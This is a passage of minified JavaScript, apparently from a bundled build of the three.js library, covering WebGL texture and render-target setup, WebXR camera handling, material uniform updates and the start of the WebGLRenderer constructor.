                i.isDataTexture2DArray && (o = 35866), i.isDataTexture3D && (o = 32879), P(t, i), n.activeTexture(33984 + r), n.bindTexture(o, t.__webglTexture), e.pixelStorei(37440, i.flipY), e.pixelStorei(37441, i.premultiplyAlpha), e.pixelStorei(3317, i.unpackAlignment), e.pixelStorei(37443, 0);
                const l = function(e) { return !s && (e.wrapS !== O || e.wrapT !== O || e.minFilter !== U && e.minFilter !== B) }(i) && !1 === v(i.image),
                    c = g(i.image, l, !1, u),
                    h = v(c) || s,
                    d = a.convert(i.format);
                let p, f = a.convert(i.type),
                    m = _(i.internalFormat, d, f);
                R(o, i, h);
                const b = i.mipmaps;
                if (i.isDepthTexture) m = 6402, s ? m = i.type === j ? 36012 : i.type === W ? 33190 : i.type === X ? 35056 : 33189 : i.type === j && console.error("WebGLRenderer: Floating point depth texture requires WebGL2."), i.format === J && 6402 === m && i.type !== V && i.type !== W && (console.warn("THREE.WebGLRenderer: Use UnsignedShortType or UnsignedIntType for DepthFormat DepthTexture."), i.type = V, f = a.convert(i.type)), i.format === K && 6402 === m && (m = 34041, i.type !== X && (console.warn("THREE.WebGLRenderer: Use UnsignedInt248Type for DepthStencilFormat DepthTexture."), i.type = X, f = a.convert(i.type))), n.texImage2D(3553, 0, m, c.width, c.height, 0, d, f, null);
                else if (i.isDataTexture)
                    if (b.length > 0 && h) {
                        for (let e = 0, t = b.length; e < t; e++) p = b[e], n.texImage2D(3553, e, m, p.width, p.height, 0, d, f, p.data);
                        i.generateMipmaps = !1, t.__maxMipLevel = b.length - 1
                    } else n.texImage2D(3553, 0, m, c.width, c.height, 0, d, f, c.data), t.__maxMipLevel = 0;
                else if (i.isCompressedTexture) {
                    for (let e = 0, t = b.length; e < t; e++) p = b[e], i.format !== Z && i.format !== Y ? null !== d ? n.compressedTexImage2D(3553, e, m, p.width, p.height, 0, p.data) : console.warn("THREE.WebGLRenderer: Attempt to load unsupported compressed texture format in .uploadTexture()") : n.texImage2D(3553, e, m, p.width, p.height, 0, d, f, p.data);
                    t.__maxMipLevel = b.length - 1
                } else if (i.isDataTexture2DArray) n.texImage3D(35866, 0, m, c.width, c.height, c.depth, 0, d, f, c.data), t.__maxMipLevel = 0;
                else if (i.isDataTexture3D) n.texImage3D(32879, 0, m, c.width, c.height, c.depth, 0, d, f, c.data), t.__maxMipLevel = 0;
                else if (b.length > 0 && h) {
                    for (let e = 0, t = b.length; e < t; e++) p = b[e], n.texImage2D(3553, e, m, d, f, p);
                    i.generateMipmaps = !1, t.__maxMipLevel = b.length - 1
                } else n.texImage2D(3553, 0, m, d, f, c), t.__maxMipLevel = 0;
                y(i, h) && x(o, i, c.width, c.height), t.__version = i.version, i.onUpdate && i.onUpdate(i)
            }

            function D(t, r, o, s) {
                const l = r.texture,
                    c = a.convert(l.format),
                    u = a.convert(l.type),
                    h = _(l.internalFormat, c, u);
                32879 === s || 35866 === s ? n.texImage3D(s, 0, h, r.width, r.height, r.depth, 0, c, u, null) : n.texImage2D(s, 0, h, r.width, r.height, 0, c, u, null), e.bindFramebuffer(36160, t), e.framebufferTexture2D(36160, o, s, i.get(l).__webglTexture, 0), e.bindFramebuffer(36160, null)
            }

            function N(t, n, i) {
                if (e.bindRenderbuffer(36161, t), n.depthBuffer && !n.stencilBuffer) {
                    let r = 33189;
                    if (i) {
                        const t = n.depthTexture;
                        t && t.isDepthTexture && (t.type === j ? r = 36012 : t.type === W && (r = 33190));
                        const i = $(n);
                        e.renderbufferStorageMultisample(36161, i, r, n.width, n.height)
                    } else e.renderbufferStorage(36161, r, n.width, n.height);
                    e.framebufferRenderbuffer(36160, 36096, 36161, t)
                } else if (n.depthBuffer && n.stencilBuffer) {
                    if (i) {
                        const t = $(n);
                        e.renderbufferStorageMultisample(36161, t, 35056, n.width, n.height)
                    } else e.renderbufferStorage(36161, 34041, n.width, n.height);
                    e.framebufferRenderbuffer(36160, 33306, 36161, t)
                } else {
                    const t = n.texture,
                        r = a.convert(t.format),
                        o = a.convert(t.type),
                        s = _(t.internalFormat, r, o);
                    if (i) {
                        const t = $(n);
                        e.renderbufferStorageMultisample(36161, t, s, n.width, n.height)
                    } else e.renderbufferStorage(36161, s, n.width, n.height)
                }
                e.bindRenderbuffer(36161, null)
            }

            function $(e) { return s && e.isWebGLMultisampleRenderTarget ? Math.min(h, e.samples) : 0 }
            let Q = !1,
                ee = !1;
            this.allocateTextureUnit = function() { const e = T; return e >= l && console.warn("THREE.WebGLTextures: Trying to use " + e + " texture units while this GPU supports only " + l), T += 1, e }, this.resetTextureUnits = function() { T = 0 }, this.setTexture2D = E, this.setTexture2DArray = function(e, t) {
                const r = i.get(e);
                e.version > 0 && r.__version !== e.version ? C(r, e, t) : (n.activeTexture(33984 + t), n.bindTexture(35866, r.__webglTexture))
            }, this.setTexture3D = function(e, t) {
                const r = i.get(e);
                e.version > 0 && r.__version !== e.version ? C(r, e, t) : (n.activeTexture(33984 + t), n.bindTexture(32879, r.__webglTexture))
            }, this.setTextureCube = S, this.setupRenderTarget = function(t) {
                const r = t.texture,
                    l = i.get(t),
                    c = i.get(r);
                t.addEventListener("dispose", M), c.__webglTexture = e.createTexture(), o.memory.textures++;
                const u = !0 === t.isWebGLCubeRenderTarget,
                    h = !0 === t.isWebGLMultisampleRenderTarget,
                    d = r.isDataTexture3D || r.isDataTexture2DArray,
                    p = v(t) || s;
                if (!s || r.format !== Y || r.type !== j && r.type !== q || (r.format = Z, console.warn("THREE.WebGLRenderer: Rendering to textures with RGB format is not supported. Using RGBA format instead.")), u) { l.__webglFramebuffer = []; for (let t = 0; t < 6; t++) l.__webglFramebuffer[t] = e.createFramebuffer() } else if (l.__webglFramebuffer = e.createFramebuffer(), h)
                    if (s) {
                        l.__webglMultisampledFramebuffer = e.createFramebuffer(), l.__webglColorRenderbuffer = e.createRenderbuffer(), e.bindRenderbuffer(36161, l.__webglColorRenderbuffer);
                        const n = a.convert(r.format),
                            i = a.convert(r.type),
                            o = _(r.internalFormat, n, i),
                            s = $(t);
                        e.renderbufferStorageMultisample(36161, s, o, t.width, t.height), e.bindFramebuffer(36160, l.__webglMultisampledFramebuffer), e.framebufferRenderbuffer(36160, 36064, 36161, l.__webglColorRenderbuffer), e.bindRenderbuffer(36161, null), t.depthBuffer && (l.__webglDepthRenderbuffer = e.createRenderbuffer(), N(l.__webglDepthRenderbuffer, t, !0)), e.bindFramebuffer(36160, null)
                    } else console.warn("THREE.WebGLRenderer: WebGLMultisampleRenderTarget can only be used with WebGL2.");
                if (u) {
                    n.bindTexture(34067, c.__webglTexture), R(34067, r, p);
                    for (let e = 0; e < 6; e++) D(l.__webglFramebuffer[e], t, 36064, 34069 + e);
                    y(r, p) && x(34067, r, t.width, t.height), n.bindTexture(34067, null)
                } else {
                    let e = 3553;
                    d && (s ? e = r.isDataTexture3D ? 32879 : 35866 : console.warn("THREE.DataTexture3D and THREE.DataTexture2DArray only supported with WebGL2.")), n.bindTexture(e, c.__webglTexture), R(e, r, p), D(l.__webglFramebuffer, t, 36064, e), y(r, p) && x(3553, r, t.width, t.height), n.bindTexture(3553, null)
                }
                t.depthBuffer && function k(t) {
                    const n = i.get(t),
                        r = !0 === t.isWebGLCubeRenderTarget;
                    if (t.depthTexture) {
                        if (r) throw new Error("target.depthTexture not supported in Cube render targets");
                        ! function(t, n) {
                            if (n && n.isWebGLCubeRenderTarget) throw new Error("Depth Texture with cube render targets is not supported");
                            if (e.bindFramebuffer(36160, t), !n.depthTexture || !n.depthTexture.isDepthTexture) throw new Error("renderTarget.depthTexture must be an instance of THREE.DepthTexture");
                            i.get(n.depthTexture).__webglTexture && n.depthTexture.image.width === n.width && n.depthTexture.image.height === n.height || (n.depthTexture.image.width = n.width, n.depthTexture.image.height = n.height, n.depthTexture.needsUpdate = !0), E(n.depthTexture, 0);
                            const r = i.get(n.depthTexture).__webglTexture;
                            if (n.depthTexture.format === J) e.framebufferTexture2D(36160, 36096, 3553, r, 0);
                            else {
                                if (n.depthTexture.format !== K) throw new Error("Unknown depthTexture format");
                                e.framebufferTexture2D(36160, 33306, 3553, r, 0)
                            }
                        }(n.__webglFramebuffer, t)
                    } else if (r) { n.__webglDepthbuffer = []; for (let i = 0; i < 6; i++) e.bindFramebuffer(36160, n.__webglFramebuffer[i]), n.__webglDepthbuffer[i] = e.createRenderbuffer(), N(n.__webglDepthbuffer[i], t, !1) } else e.bindFramebuffer(36160, n.__webglFramebuffer), n.__webglDepthbuffer = e.createRenderbuffer(), N(n.__webglDepthbuffer, t, !1);
                    e.bindFramebuffer(36160, null)
                }(t)
            }, this.updateRenderTargetMipmap = function(e) {
                const t = e.texture;
                if (y(t, v(e) || s)) {
                    const r = e.isWebGLCubeRenderTarget ? 34067 : 3553,
                        a = i.get(t).__webglTexture;
                    n.bindTexture(r, a), x(r, t, e.width, e.height), n.bindTexture(r, null)
                }
            }, this.updateMultisampleRenderTarget = function(t) {
                if (t.isWebGLMultisampleRenderTarget)
                    if (s) {
                        const n = i.get(t);
                        e.bindFramebuffer(36008, n.__webglMultisampledFramebuffer), e.bindFramebuffer(36009, n.__webglFramebuffer);
                        const r = t.width,
                            a = t.height;
                        let o = 16384;
                        t.depthBuffer && (o |= 256), t.stencilBuffer && (o |= 1024), e.blitFramebuffer(0, 0, r, a, 0, 0, r, a, o, 9728), e.bindFramebuffer(36160, n.__webglMultisampledFramebuffer)
                    } else console.warn("THREE.WebGLRenderer: WebGLMultisampleRenderTarget can only be used with WebGL2.")
            }, this.safeSetTexture2D = function(e, t) { e && e.isWebGLRenderTarget && (!1 === Q && (console.warn("THREE.WebGLTextures.safeSetTexture2D: don't use render targets as textures. Use their .texture property instead."), Q = !0), e = e.texture), E(e, t) }, this.safeSetTextureCube = function(e, t) { e && e.isWebGLCubeRenderTarget && (!1 === ee && (console.warn("THREE.WebGLTextures.safeSetTextureCube: don't use cube render targets as textures. Use their .texture property instead."), ee = !0), e = e.texture), S(e, t) }
        }

        function Zr(e, t, n) { const i = n.isWebGL2; return { convert: function(e) { let n; if (e === k) return 5121; if (1017 === e) return 32819; if (1018 === e) return 32820; if (1019 === e) return 33635; if (1010 === e) return 5120; if (1011 === e) return 5122; if (e === V) return 5123; if (1013 === e) return 5124; if (e === W) return 5125; if (e === j) return 5126; if (e === q) return i ? 5131 : (n = t.get("OES_texture_half_float"), null !== n ? n.HALF_FLOAT_OES : null); if (1021 === e) return 6406; if (e === Y) return 6407; if (e === Z) return 6408; if (1024 === e) return 6409; if (1025 === e) return 6410; if (e === J) return 6402; if (e === K) return 34041; if (1028 === e) return 6403; if (1029 === e) return 36244; if (1030 === e) return 33319; if (1031 === e) return 33320; if (1032 === e) return 36248; if (1033 === e) return 36249; if (33776 === e || 33777 === e || 33778 === e || 33779 === e) { if (n = t.get("WEBGL_compressed_texture_s3tc"), null === n) return null; if (33776 === e) return n.COMPRESSED_RGB_S3TC_DXT1_EXT; if (33777 === e) return n.COMPRESSED_RGBA_S3TC_DXT1_EXT; if (33778 === e) return n.COMPRESSED_RGBA_S3TC_DXT3_EXT; if (33779 === e) return n.COMPRESSED_RGBA_S3TC_DXT5_EXT } if (35840 === e || 35841 === e || 35842 === e || 35843 === e) { if (n = t.get("WEBGL_compressed_texture_pvrtc"), null === n) return null; if (35840 === e) return n.COMPRESSED_RGB_PVRTC_4BPPV1_IMG; if (35841 === e) return n.COMPRESSED_RGB_PVRTC_2BPPV1_IMG; if (35842 === e) return n.COMPRESSED_RGBA_PVRTC_4BPPV1_IMG; if (35843 === e) return n.COMPRESSED_RGBA_PVRTC_2BPPV1_IMG } if (36196 === e) return n = t.get("WEBGL_compressed_texture_etc1"), null !== n ? n.COMPRESSED_RGB_ETC1_WEBGL : null; if ((37492 === e || 37496 === e) && (n = t.get("WEBGL_compressed_texture_etc"), null !== n)) { if (37492 === e) return n.COMPRESSED_RGB8_ETC2; if (37496 === e) return n.COMPRESSED_RGBA8_ETC2_EAC } return 37808 === e || 37809 === e || 37810 === e || 37811 === e || 37812 === e || 37813 === e || 37814 === e || 37815 === e || 37816 === e || 37817 === e || 37818 === e || 37819 === e || 37820 === e || 37821 === e || 37840 === e || 37841 === e || 37842 === e || 37843 === e || 37844 === e || 37845 === e || 37846 === e || 37847 === e || 37848 === e || 37849 === e || 37850 === e || 37851 === e || 37852 === e || 37853 === e ? (n = t.get("WEBGL_compressed_texture_astc"), null !== n ? e : null) : 36492 === e ? (n = t.get("EXT_texture_compression_bptc"), null !== n ? e : null) : e === X ? i ? 34042 : (n = t.get("WEBGL_depth_texture"), null !== n ? n.UNSIGNED_INT_24_8_WEBGL : null) : void 0 } } }

        function Jr(e = []) { Bn.call(this), this.cameras = e }
        jr.prototype.isMeshDistanceMaterial = !0, Jr.prototype = Object.assign(Object.create(Bn.prototype), { constructor: Jr, isArrayCamera: !0 });
        class Kr extends _t { constructor() { super(), this.type = "Group" } }

        function $r() { this._targetRay = null, this._grip = null, this._hand = null }

        function Qr(e, t) {
            const n = this;
            let i = null,
                r = 1,
                a = null,
                o = "local-floor",
                s = null;
            const l = [],
                c = new Map,
                u = new Bn;
            u.layers.enable(1), u.viewport = new ye;
            const h = new Bn;
            h.layers.enable(2), h.viewport = new ye;
            const d = [u, h],
                p = new Jr;
            p.layers.enable(1), p.layers.enable(2);
            let f = null,
                m = null;

            function g(e) {
                const t = c.get(e.inputSource);
                t && t.dispatchEvent({ type: e.type, data: e.inputSource })
            }

            function v() { c.forEach((function(e, t) { e.disconnect(t) })), c.clear(), f = null, m = null, e.setFramebuffer(null), e.setRenderTarget(e.getRenderTarget()), M.stop(), n.isPresenting = !1, n.dispatchEvent({ type: "sessionend" }) }

            function y(e) {
                const t = i.inputSources;
                for (let e = 0; e < l.length; e++) c.set(t[e], l[e]);
                for (let t = 0; t < e.removed.length; t++) {
                    const n = e.removed[t],
                        i = c.get(n);
                    i && (i.dispatchEvent({ type: "disconnected", data: n }), c.delete(n))
                }
                for (let t = 0; t < e.added.length; t++) {
                    const n = e.added[t],
                        i = c.get(n);
                    i && i.dispatchEvent({ type: "connected", data: n })
                }
            }
            this.enabled = !1, this.isPresenting = !1, this.getController = function(e) { let t = l[e]; return void 0 === t && (t = new $r, l[e] = t), t.getTargetRaySpace() }, this.getControllerGrip = function(e) { let t = l[e]; return void 0 === t && (t = new $r, l[e] = t), t.getGripSpace() }, this.getHand = function(e) { let t = l[e]; return void 0 === t && (t = new $r, l[e] = t), t.getHandSpace() }, this.setFramebufferScaleFactor = function(e) { r = e, !0 === n.isPresenting && console.warn("THREE.WebXRManager: Cannot change framebuffer scale while presenting.") }, this.setReferenceSpaceType = function(e) { o = e, !0 === n.isPresenting && console.warn("THREE.WebXRManager: Cannot change reference space type while presenting.") }, this.getReferenceSpace = function() { return a }, this.getSession = function() { return i }, this.setSession = async function(e) {
                if (i = e, null !== i) {
                    i.addEventListener("select", g), i.addEventListener("selectstart", g), i.addEventListener("selectend", g), i.addEventListener("squeeze", g), i.addEventListener("squeezestart", g), i.addEventListener("squeezeend", g), i.addEventListener("end", v), i.addEventListener("inputsourceschange", y);
                    const e = t.getContextAttributes();
                    !0 !== e.xrCompatible && await t.makeXRCompatible();
                    const s = { antialias: e.antialias, alpha: e.alpha, depth: e.depth, stencil: e.stencil, framebufferScaleFactor: r },
                        l = new XRWebGLLayer(i, t, s);
                    i.updateRenderState({ baseLayer: l }), a = await i.requestReferenceSpace(o), M.setContext(i), M.start(), n.isPresenting = !0, n.dispatchEvent({ type: "sessionstart" })
                }
            };
            const x = new be,
                _ = new be;

            function b(e, t) { null === t ? e.matrixWorld.copy(e.matrix) : e.matrixWorld.multiplyMatrices(t.matrixWorld, e.matrix), e.matrixWorldInverse.copy(e.matrixWorld).invert() }
            this.getCamera = function(e) {
                p.near = h.near = u.near = e.near, p.far = h.far = u.far = e.far, f === p.near && m === p.far || (i.updateRenderState({ depthNear: p.near, depthFar: p.far }), f = p.near, m = p.far);
                const t = e.parent,
                    n = p.cameras;
                b(p, t);
                for (let e = 0; e < n.length; e++) b(n[e], t);
                e.matrixWorld.copy(p.matrixWorld), e.matrix.copy(p.matrix), e.matrix.decompose(e.position, e.quaternion, e.scale);
                const r = e.children;
                for (let e = 0, t = r.length; e < t; e++) r[e].updateMatrixWorld(!0);
                return 2 === n.length ? function(e, t, n) {
                    x.setFromMatrixPosition(t.matrixWorld), _.setFromMatrixPosition(n.matrixWorld);
                    const i = x.distanceTo(_),
                        r = t.projectionMatrix.elements,
                        a = n.projectionMatrix.elements,
                        o = r[14] / (r[10] - 1),
                        s = r[14] / (r[10] + 1),
                        l = (r[9] + 1) / r[5],
                        c = (r[9] - 1) / r[5],
                        u = (r[8] - 1) / r[0],
                        h = (a[8] + 1) / a[0],
                        d = o * u,
                        p = o * h,
                        f = i / (-u + h),
                        m = f * -u;
                    t.matrixWorld.decompose(e.position, e.quaternion, e.scale), e.translateX(m), e.translateZ(f), e.matrixWorld.compose(e.position, e.quaternion, e.scale), e.matrixWorldInverse.copy(e.matrixWorld).invert();
                    const g = o + f,
                        v = s + f,
                        y = d - m,
                        b = p + (i - m),
                        w = l * s / v * g,
                        M = c * s / v * g;
                    e.projectionMatrix.makePerspective(y, b, w, M, g, v)
                }(p, u, h) : p.projectionMatrix.copy(u.projectionMatrix), p
            };
            let w = null;
            const M = new Zn;
            M.setAnimationLoop((function(t, n) {
                if (s = n.getViewerPose(a), null !== s) {
                    const t = s.views,
                        n = i.renderState.baseLayer;
                    e.setFramebuffer(n.framebuffer);
                    let r = !1;
                    t.length !== p.cameras.length && (p.cameras.length = 0, r = !0);
                    for (let e = 0; e < t.length; e++) {
                        const i = t[e],
                            a = n.getViewport(i),
                            o = d[e];
                        o.matrix.fromArray(i.transform.matrix), o.projectionMatrix.fromArray(i.projectionMatrix), o.viewport.set(a.x, a.y, a.width, a.height), 0 === e && p.matrix.copy(o.matrix), !0 === r && p.cameras.push(o)
                    }
                }
                const r = i.inputSources;
                for (let e = 0; e < l.length; e++) {
                    const t = l[e],
                        i = r[e];
                    t.update(i, n, a)
                }
                w && w(t, n)
            })), this.setAnimationLoop = function(e) { w = e }, this.dispose = function() {}
        }

        function ea(e) {
            function t(t, n) {
                t.opacity.value = n.opacity, n.color && t.diffuse.value.copy(n.color), n.emissive && t.emissive.value.copy(n.emissive).multiplyScalar(n.emissiveIntensity), n.map && (t.map.value = n.map), n.alphaMap && (t.alphaMap.value = n.alphaMap), n.specularMap && (t.specularMap.value = n.specularMap);
                const i = e.get(n).envMap;
                if (i) {
                    t.envMap.value = i, t.flipEnvMap.value = i.isCubeTexture && i._needsFlipEnvMap ? -1 : 1, t.reflectivity.value = n.reflectivity, t.refractionRatio.value = n.refractionRatio;
                    const r = e.get(i).__maxMipLevel;
                    void 0 !== r && (t.maxMipLevel.value = r)
                }
                let r, a;
                n.lightMap && (t.lightMap.value = n.lightMap, t.lightMapIntensity.value = n.lightMapIntensity), n.aoMap && (t.aoMap.value = n.aoMap, t.aoMapIntensity.value = n.aoMapIntensity), n.map ? r = n.map : n.specularMap ? r = n.specularMap : n.displacementMap ? r = n.displacementMap : n.normalMap ? r = n.normalMap : n.bumpMap ? r = n.bumpMap : n.roughnessMap ? r = n.roughnessMap : n.metalnessMap ? r = n.metalnessMap : n.alphaMap ? r = n.alphaMap : n.emissiveMap ? r = n.emissiveMap : n.clearcoatMap ? r = n.clearcoatMap : n.clearcoatNormalMap ? r = n.clearcoatNormalMap : n.clearcoatRoughnessMap && (r = n.clearcoatRoughnessMap), void 0 !== r && (r.isWebGLRenderTarget && (r = r.texture), !0 === r.matrixAutoUpdate && r.updateMatrix(), t.uvTransform.value.copy(r.matrix)), n.aoMap ? a = n.aoMap : n.lightMap && (a = n.lightMap), void 0 !== a && (a.isWebGLRenderTarget && (a = a.texture), !0 === a.matrixAutoUpdate && a.updateMatrix(), t.uv2Transform.value.copy(a.matrix))
            }

            function n(t, n) { t.roughness.value = n.roughness, t.metalness.value = n.metalness, n.roughnessMap && (t.roughnessMap.value = n.roughnessMap), n.metalnessMap && (t.metalnessMap.value = n.metalnessMap), n.emissiveMap && (t.emissiveMap.value = n.emissiveMap), n.bumpMap && (t.bumpMap.value = n.bumpMap, t.bumpScale.value = n.bumpScale, 1 === n.side && (t.bumpScale.value *= -1)), n.normalMap && (t.normalMap.value = n.normalMap, t.normalScale.value.copy(n.normalScale), 1 === n.side && t.normalScale.value.negate()), n.displacementMap && (t.displacementMap.value = n.displacementMap, t.displacementScale.value = n.displacementScale, t.displacementBias.value = n.displacementBias), e.get(n).envMap && (t.envMapIntensity.value = n.envMapIntensity) }
            return {
                refreshFogUniforms: function(e, t) { e.fogColor.value.copy(t.color), t.isFog ? (e.fogNear.value = t.near, e.fogFar.value = t.far) : t.isFogExp2 && (e.fogDensity.value = t.density) },
                refreshMaterialUniforms: function(e, i, r, a) {
                    i.isMeshBasicMaterial ? t(e, i) : i.isMeshLambertMaterial ? (t(e, i), function(e, t) { t.emissiveMap && (e.emissiveMap.value = t.emissiveMap) }(e, i)) : i.isMeshToonMaterial ? (t(e, i), function(e, t) { t.gradientMap && (e.gradientMap.value = t.gradientMap), t.emissiveMap && (e.emissiveMap.value = t.emissiveMap), t.bumpMap && (e.bumpMap.value = t.bumpMap, e.bumpScale.value = t.bumpScale, 1 === t.side && (e.bumpScale.value *= -1)), t.normalMap && (e.normalMap.value = t.normalMap, e.normalScale.value.copy(t.normalScale), 1 === t.side && e.normalScale.value.negate()), t.displacementMap && (e.displacementMap.value = t.displacementMap, e.displacementScale.value = t.displacementScale, e.displacementBias.value = t.displacementBias) }(e, i)) : i.isMeshPhongMaterial ? (t(e, i), function(e, t) { e.specular.value.copy(t.specular), e.shininess.value = Math.max(t.shininess, 1e-4), t.emissiveMap && (e.emissiveMap.value = t.emissiveMap), t.bumpMap && (e.bumpMap.value = t.bumpMap, e.bumpScale.value = t.bumpScale, 1 === t.side && (e.bumpScale.value *= -1)), t.normalMap && (e.normalMap.value = t.normalMap, e.normalScale.value.copy(t.normalScale), 1 === t.side && e.normalScale.value.negate()), t.displacementMap && (e.displacementMap.value = t.displacementMap, e.displacementScale.value = t.displacementScale, e.displacementBias.value = t.displacementBias) }(e, i)) : i.isMeshStandardMaterial ? (t(e, i), i.isMeshPhysicalMaterial ? function(e, t) { n(e, t), e.reflectivity.value = t.reflectivity, e.clearcoat.value = t.clearcoat, e.clearcoatRoughness.value = t.clearcoatRoughness, t.sheen && e.sheen.value.copy(t.sheen), t.clearcoatMap && (e.clearcoatMap.value = t.clearcoatMap), t.clearcoatRoughnessMap && (e.clearcoatRoughnessMap.value = t.clearcoatRoughnessMap), t.clearcoatNormalMap && (e.clearcoatNormalScale.value.copy(t.clearcoatNormalScale), e.clearcoatNormalMap.value = t.clearcoatNormalMap, 1 === t.side && e.clearcoatNormalScale.value.negate()), e.transmission.value = t.transmission, t.transmissionMap && (e.transmissionMap.value = t.transmissionMap) }(e, i) : n(e, i)) : i.isMeshMatcapMaterial ? (t(e, i), function(e, t) { t.matcap && (e.matcap.value = t.matcap), t.bumpMap && (e.bumpMap.value = t.bumpMap, e.bumpScale.value = t.bumpScale, 1 === t.side && (e.bumpScale.value *= -1)), t.normalMap && (e.normalMap.value = t.normalMap, e.normalScale.value.copy(t.normalScale), 1 === t.side && e.normalScale.value.negate()), t.displacementMap && (e.displacementMap.value = t.displacementMap, e.displacementScale.value = t.displacementScale, e.displacementBias.value = t.displacementBias) }(e, i)) : i.isMeshDepthMaterial ? (t(e, i), function(e, t) { t.displacementMap && (e.displacementMap.value = t.displacementMap, e.displacementScale.value = t.displacementScale, e.displacementBias.value = t.displacementBias) }(e, i)) : i.isMeshDistanceMaterial ? (t(e, i), function(e, t) { t.displacementMap && (e.displacementMap.value = t.displacementMap, e.displacementScale.value = t.displacementScale, e.displacementBias.value = t.displacementBias), e.referencePosition.value.copy(t.referencePosition), e.nearDistance.value = t.nearDistance, e.farDistance.value = t.farDistance }(e, i)) : i.isMeshNormalMaterial ? (t(e, i), function(e, t) { t.bumpMap && (e.bumpMap.value = t.bumpMap, e.bumpScale.value = t.bumpScale, 1 === t.side && (e.bumpScale.value *= -1)), t.normalMap && (e.normalMap.value = t.normalMap, e.normalScale.value.copy(t.normalScale), 1 === t.side && e.normalScale.value.negate()), t.displacementMap && (e.displacementMap.value = t.displacementMap, e.displacementScale.value = t.displacementScale, e.displacementBias.value = t.displacementBias) }(e, i)) : i.isLineBasicMaterial ? (function(e, t) { e.diffuse.value.copy(t.color), e.opacity.value = t.opacity }(e, i), i.isLineDashedMaterial && function(e, t) { e.dashSize.value = t.dashSize, e.totalSize.value = t.dashSize + t.gapSize, e.scale.value = t.scale }(e, i)) : i.isPointsMaterial ? function(e, t, n, i) {
                        let r;
                        e.diffuse.value.copy(t.color), e.opacity.value = t.opacity, e.size.value = t.size * n, e.scale.value = .5 * i, t.map && (e.map.value = t.map), t.alphaMap && (e.alphaMap.value = t.alphaMap), t.map ? r = t.map : t.alphaMap && (r = t.alphaMap), void 0 !== r && (!0 === r.matrixAutoUpdate && r.updateMatrix(), e.uvTransform.value.copy(r.matrix))
                    }(e, i, r, a) : i.isSpriteMaterial ? function(e, t) {
                        let n;
                        e.diffuse.value.copy(t.color), e.opacity.value = t.opacity, e.rotation.value = t.rotation, t.map && (e.map.value = t.map), t.alphaMap && (e.alphaMap.value = t.alphaMap), t.map ? n = t.map : t.alphaMap && (n = t.alphaMap), void 0 !== n && (!0 === n.matrixAutoUpdate && n.updateMatrix(), e.uvTransform.value.copy(n.matrix))
                    }(e, i) : i.isShadowMaterial ? (e.color.value.copy(i.color), e.opacity.value = i.opacity) : i.isShaderMaterial && (i.uniformsNeedUpdate = !1)
                }
            }
        }

        function ta(e) {
            const t = void 0 !== (e = e || {}).canvas ? e.canvas : function() { const e = document.createElementNS("http://www.w3.org/1999/xhtml", "canvas"); return e.style.display = "block", e }(),
                n = void 0 !== e.context ? e.context : null,
                i = void 0 !== e.alpha && e.alpha,
                r = void 0 === e.depth || e.depth,
                a = void 0 === e.stencil || e.stencil,
                o = void 0 !== e.antialias && e.antialias,
                s = void 0 === e.premultipliedAlpha || e.premultipliedAlpha,
                l = void 0 !== e.preserveDrawingBuffer && e.preserveDrawingBuffer,
                c = void 0 !== e.powerPreference ? e.powerPreference : "default",
                u = void 0 !== e.failIfMajorPerformanceCaveat && e.failIfMajorPerformanceCaveat;
            let h = null,
                d = null;
            const p = [],
                f = [];
            this.domElement = t, this.debug = { checkShaderErrors: !0 }, this.autoClear = !0, this.autoClearColor = !0, this.autoClearDepth = !0, this.autoClearStencil = !0, this.sortObjects = !0, this.clippingPlanes = [], this.localClippingEnabled = !1, this.gammaFactor = 2, this.outputEncoding = te, this.physicallyCorrectLights = !1, this.toneMapping = 0, this.toneMappingExposure = 1, this.maxMorphTargets = 8, this.maxMorphNormals = 4;
            const m = this;
            let g = !1,
                v = null,
                y = 0,
                x = 0,
                _ = null,
                b = null,
                w = -1,
                M = null;
            const T = new ye,
                E = new ye;
            let S = null,
                L = t.width,
                A = t.height,
                R = 1,
                P = null,
                C = null;
            const D = new ye(0, 0, L, A),
                N = new ye(0, 0, L, A);
            let I = !1;
            const O = new Yn;
            let H = !1,
                U = !1;
            const F = new Ze,
                z = new be,
                B = { background: null, fog: null, environment: null, overrideMaterial: null, isScene: !0 };

            function G() { return null === _ ? R : 1 }
            let V, W, X, Y, J, K, $, Q, ee, ne, ie, re, ae, oe, se, le, ce, de, pe, fe, me, ge = n;

            function ve(e, n) {
                for (let i = 0; i < e.length; i++) {
                    const r = e[i],
                        a = t.getContext(r, n);
                    if (null !== a) return a
                }
                return null
            }
            try {
                const e = { alpha: i, depth: r, stencil: a, antialias: o, premultipliedAlpha: s, preserveDrawingBuffer: l, powerPreference: c, failIfMajorPerformanceCaveat: u };
                if (t.addEventListener("webglcontextlost", Me, !1), t.addEventListener("webglcontextrestored", Te, !1), null === ge) { const t = ["webgl2", "webgl", "experimental-webgl"]; if (!0 === m.isWebGL1Renderer && t.shift(), ge = ve(t, e), null === ge) throw ve(t) ? new Error("Error creating WebGL context with your selected attributes.") : new Error("Error creating WebGL context.") }
                void 0 === ge.getShaderPrecisionFormat && (ge.getShaderPrecisionFormat = function() { return { rangeMin: 1, rangeMax: 1, precision: 1 } })
            } catch (e) { throw console.error("THREE.WebGLRenderer: " + e.message), e }

            function xe() { V = new si(ge), W = new ri(ge, V, e), V.init(W), fe = new Zr(ge, V, W), X = new Xr(ge, V, W), X.scissor(E.copy(N).multiplyScalar(R).floor()), X.viewport(T.copy(D).multiplyScalar(R).floor()), Y = new ui(ge), J = new Nr, K = new Yr(ge, V, X, J, W, fe, Y), $ = new oi(m), Q = new Jn(ge, W), me = new ni(ge, V, Q, W), ee = new li(ge, Q, Y, me), ne = new fi(ge, ee, Q, Y), ce = new pi(ge), se = new ai(J), ie = new Dr(m, $, V, W, me, se), re = new ea(J), ae = new Ur(J), oe = new Vr(V, W), le = new ti(m, $, X, ne, s), de = new ii(ge, V, Y, W), pe = new ci(ge, V, Y, W), Y.programs = ie.programs, m.capabilities = W, m.extensions = V, m.properties = J, m.renderLists = ae, m.state = X, m.info = Y }
            xe();
            const _e = new Qr(m, ge);
            this.xr = _e;
            const we = new qr(m, ne, W.maxTextureSize);

            function Me(e) { e.preventDefault(), console.log("THREE.WebGLRenderer: Context Lost."), g = !0 }

            function Te() { console.log("THREE.WebGLRenderer: Context Restored."), g = !1, xe() }

            function Ee(e) {
                const t = e.target;
                t.removeEventListener("dispose", Ee),
                    function(e) { Se(e), J.remove(e) }(t)
            }

            function Se(e) {
                const t = J.get(e).program;
                void 0 !== t && ie.releaseProgram(t)
            }
